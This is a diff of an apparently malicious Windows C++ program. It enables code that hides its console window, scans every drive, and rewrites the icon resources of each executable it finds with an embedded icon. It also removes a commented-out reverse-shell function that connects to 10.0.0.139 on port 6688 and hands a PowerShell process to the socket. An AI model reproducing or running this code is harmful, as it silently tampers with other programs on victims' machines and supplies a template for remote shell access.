@@ -1,7 +1,6 @@
 ﻿//#define _WINSOCK_DEPRECATED_NO_WARNINGS
 
 #include "resource.h"
-//#include <WinSock2.h>
 //#include <stdio.h>
 //#pragma comment(lib,"ws2_32")
 //#include <ws2tcpip.h>
@@ -34,43 +33,6 @@
 //    __in        DWORD       dwFlags
 //);
 
-//void CreateRevShell()
-//{
-//    WSADATA wsaData;
-//    SOCKET Winsock;
-//    struct sockaddr_in hax;
-//    char ip_addr[11] = "10.0.0.139"; //RHOST
-//    char port[5] = "6688"; //RPORT
-//
-//    STARTUPINFO ini_processo;
-//
-//    PROCESS_INFORMATION processo_info;
-//
-//    WSAStartup(MAKEWORD(2, 2), &wsaData);
-//    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
-//
-//    struct hostent* host;
-//    host = gethostbyname(ip_addr);
-//    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr*)host->h_addr)));
-//
-//    //inet_ntop()
-//
-//    hax.sin_family = AF_INET;
-//    hax.sin_port = htons(atoi(port));
-//    hax.sin_addr.s_addr = inet_addr(ip_addr);
-//
-//    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
-//
-//    memset(&ini_processo, 0, sizeof(ini_processo));
-//    ini_processo.cb = sizeof(ini_processo);
-//    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-//    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
-//
-//    TCHAR cmd[15] = { 'p', 'o', 'w', 'e', 'r', 's', 'h', 'e', 'l', 'l', '.', 'e', 'x', 'e', 0 };
-//
-//    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
-//
-//}
 
 std::vector<std::wstring> GetDriveLetters()
 {
@@ -111,6 +73,7 @@ BOOL CALLBACK EnumIconLang(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD
     resNames.emplace(lpName, wLanguage);
     return true;
 }
+
 BOOL CALLBACK EnumIconNames(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam)
 {
     if (lpType == NULL && lpName == NULL)
@@ -120,7 +83,7 @@ BOOL CALLBACK EnumIconNames(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG
 
     if (!::EnumResourceLanguagesExW(hModule, lpType, lpName, EnumIconLang, lParam, 0, 0))
     {
-
+        // if error, just continue
     }
 
     return true;
@@ -157,7 +120,7 @@ void ReplaceEXEIconResources(std::filesystem::path* pathStart, LPVOID lpMDcanIco
                     case 1813:
                     {
                         
-                        /*std::wcout << currentPath << "\n" << "No icon resources detected, attempting to add" << "\n";
+                        std::wcout << currentPath << "\n" << "No icon resources detected, attempting to add" << "\n";
                         if (!::FreeLibrary(hmTheExe))
                         {
                             resNames.clear();
@@ -186,8 +149,8 @@ void ReplaceEXEIconResources(std::filesystem::path* pathStart, LPVOID lpMDcanIco
                             std::wcout << ::GetLastError() << " Could not end update resource." << "\n";
                             resNames.clear();
                             continue;
-                        }*/
-                        //resNames.clear();
+                        }
+                        resNames.clear();
                         break;
                     }
                     default:
@@ -203,7 +166,7 @@ void ReplaceEXEIconResources(std::filesystem::path* pathStart, LPVOID lpMDcanIco
                 continue;
             }
 
-            /*HANDLE hUpdateResource = ::BeginUpdateResourceW(currentPath.c_str(), false);
+            HANDLE hUpdateResource = ::BeginUpdateResourceW(currentPath.c_str(), false);
             if (hUpdateResource == NULL)
             {
                 resNames.clear();
@@ -224,31 +187,24 @@ void ReplaceEXEIconResources(std::filesystem::path* pathStart, LPVOID lpMDcanIco
             {
                 resNames.clear();
                 continue;
-            }*/
+            }
 
             resNames.clear();
         }
     }
 }
 
-void ReplaceSysIcons()
-{
-    // Get paths to 
-    // C:\Windows\SystemResources\imageres.dll.mun
-    // C:\Windows\SystemResources\shell32.dll.mun
-    // ...
-}
+//void ReplaceSysIcons()
+//{
+//    // Get paths to 
+//    // C:\Windows\SystemResources\imageres.dll.mun
+//    // C:\Windows\SystemResources\shell32.dll.mun
+//    // ...
+//}
 
 int main()
 {
-    
-    //::SetPrivi
-    //::EnableDebugPr
-    //d_GetModuleHandle(L"Something");
-
-    //d_LoadLibraryExW c_LoadLibraryExW = (d_LoadLibraryExW)GetProcAddress();
-
-    //::FreeConsole();
+    ::FreeConsole();
 
     HRSRC hresMDCanIcon = ::FindResourceExW(NULL, MAKEINTRESOURCE(RT_ICON), MAKEINTRESOURCE(1), 0);
     if (hresMDCanIcon == NULL)
@@ -274,19 +230,13 @@ int main()
         return -1;
     }
     
-    //std::vector<std::wstring> drives = GetDriveLetters();
+    std::vector<std::wstring> drives = GetDriveLetters();
 
-    //std::thread rplSystemIcons(ReplaceSysIcons);
-
-    /*for (auto &drive : drives)
+    for (auto &drive : drives)
     {
         std::filesystem::path drivepath = drive.c_str();
         ReplaceEXEIconResources(&drivepath, lpMDcanIcon, dwMDcanIconSize);
-    }*/
-
-    ::SleepEx(90000, 0);
-
-    //CreateRevShell();
+    }
 
     UnlockResource(lpMDcanIcon);
     ::FreeResource(hgMDcanIcon);
